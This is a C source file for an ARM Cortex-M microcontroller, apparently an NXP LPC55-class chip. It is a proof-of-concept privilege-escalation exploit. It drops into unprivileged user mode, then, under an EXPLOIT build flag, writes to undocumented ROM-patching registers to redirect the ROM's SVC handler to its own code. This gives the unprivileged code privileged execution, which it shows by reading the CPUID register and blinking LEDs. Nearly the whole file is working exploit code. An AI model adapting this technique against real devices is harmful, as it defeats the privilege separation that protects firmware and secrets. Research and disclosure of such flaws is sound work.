void read_cpuid(void)
{
	volatile int *cpuid = (volatile int *)0xE000ED00;

	// If we are actually privileged this should succeed,
	// if not, trigger a bus fault
	int my_id = *cpuid;
}

void blink_red(void)
{
	volatile int *gpio = (volatile int *)0x5008c000;

	read_cpuid();

	while (1) {

		volatile int i;;

		i = 0;

		gpio[0x8a1] = 0x40;

		while ( i < 0x100000 )
			i++;

		i = 0;

		gpio[0x881] = 0x40;

		while ( i < 0x100000 )
			i++;

	}

}

// Reading the cpuid register when unprivileged triggers a bus fault
// (see D1.2.16 of the ARM manual) so blink the blue LED if we hit that
// case
void blink_blue(void)
{
	volatile int *gpio = (volatile int *)0x5008c000;
	volatile int *cpuid = (volatile int *)0xE000ED00;

	int my_id = *cpuid;

	while (1) {

		volatile int i;;

		i = 0;

		gpio[0x8a1] = 0x10;

		while ( i < 0x100000 )
			i++;

		i = 0;

		gpio[0x881] = 0x10;

		while ( i < 0x100000 )
			i++;

	}

}

// Blink green and make an SVC call every loop
void blink_green(void)
{
	volatile int *gpio = (volatile int *)0x5008c000;

	while (1) {

		volatile int i;

		i = 0;

		gpio[0x8a1] = 0x80;

		while ( i < 0x100000 )
			i++;

		i = 0;

		gpio[0x881] = 0x80;

		while ( i < 0x100000 )
			i++;

		// Make an SVC call for good measure
		asm("svc #0xff");

	}

}


void patch_rom(void)
{
	// This holds a function pointer for handling svc calls in ROM
	int change_addr = 0x130002d4;

	// Register with some kind of settings (might be on/off?)
	volatile int *rom_patch_setting = (volatile int *)0x5003e0f4;

	// Register that holds our patching address
	volatile int *rom_patch_target_addr = (volatile int *)0x5003e100;

	// Register that holds the patching instruction
	volatile int *rom_patch_target_insn = (volatile int *)0x5003e0f0;


	// The syscon block for changing the vector
	volatile int *syscon = (volatile int *)0x50000000;

	// unlock rom patching (guess based on disassembly)
	*rom_patch_setting = 0x20000000;

	// Write the address we're changing (SVC function pointer)
	*rom_patch_target_addr = change_addr;

	// Make that SVC handler do something we like better
	*rom_patch_target_insn = ((int)blink_red) | 1;

	// Renable the patching (guessing that we only need one but
	// this is copied from the dump)
	*rom_patch_setting = 0x7;

	// remake the vector table to use the ROM space version
	*syscon = 0x0;
}

void user(void)
{
	// Hello from user mode!

#ifdef CAUSE_FAULT
	read_cpuid();
#endif

#ifdef EXPLOIT
	patch_rom();
#endif

	blink_green();
}

struct exception_handler {
	int r0;
	int r1;
	int r2;
	int r3;
	int r12;
	int lr;
	int pc;
	int xpsr;
	int fpu[16];
	int fpscr;
	int reserved;
};

int main()
{
	volatile int *shcsr = (volatile int *)0xe000ed24;
	volatile int *shpr = (volatile int *)0xe000ed18;
	volatile int *nvic_ipr = (volatile int *)0xe000e400;
	volatile int *syscon = (volatile int *)0x50000000;
	volatile int *iocon = (volatile int *)0x50001000;
	volatile int *gpio = (volatile int *)0x5008c000;

	volatile int *cpacr = (volatile int *)0xE000ED88;


	// Enable our fault handlers
	*shcsr = 0xf0000;

	//set priorities of the handlers
	shpr[0] = 0x0;
	shpr[1] = 0xff000000;
	shpr[2] = 0xffff0000;

	// Make sure all interrupts are off
	nvic_ipr[0] = 0xffffffff;
	nvic_ipr[1] = 0xffffffff;

	// Enable floating point to avoid faults (could also return with
	// it off)
	*cpacr = 0xf00000;

	// Bring GPIO/IOCON out of reset and enable clocks
	syscon[0x50] = 0xe000;
	syscon[0x88] = 0xe000;

	// make the output digital
	iocon[38] = 0x100;
	iocon[39] = 0x100;
	iocon[36] = 0x100;

	// Mark our leds as output
	gpio[0x801] = 0xD0;

	// Keep the LEDs off for now
	gpio[0x881] = 0xD0;


	struct exception_handler *stack_frame = (struct exception_handler *)(0x20002000 - 26*4);

	stack_frame->r0 = 0;
	stack_frame->r1 = 0;
	stack_frame->r2 = 0;
	stack_frame->r3 = 0;
	stack_frame->r12 = 0;
	stack_frame->lr = 0xffffffff;
	stack_frame->pc = ((int)user) | 1; // Where to return plus set thmb
	stack_frame->xpsr = 1 << 24;

	stack_frame->fpu[0] = 0;
	stack_frame->fpu[1] = 0;
	stack_frame->fpu[2] = 0;
	stack_frame->fpu[3] = 0;
	stack_frame->fpu[4] = 0;
	stack_frame->fpu[5] = 0;
	stack_frame->fpu[6] = 0;
	stack_frame->fpu[7] = 0;
	stack_frame->fpu[8] = 0;
	stack_frame->fpu[9] = 0;
	stack_frame->fpu[10] = 0;
	stack_frame->fpu[11] = 0;
	stack_frame->fpu[12] = 0;
	stack_frame->fpu[13] = 0;
	stack_frame->fpu[14] = 0;
	stack_frame->fpu[15] = 0;

	stack_frame->fpscr = 0;
	stack_frame->reserved = 0;

	// Now make an svc call to do our final switch over
	asm("svc #0xff");

}
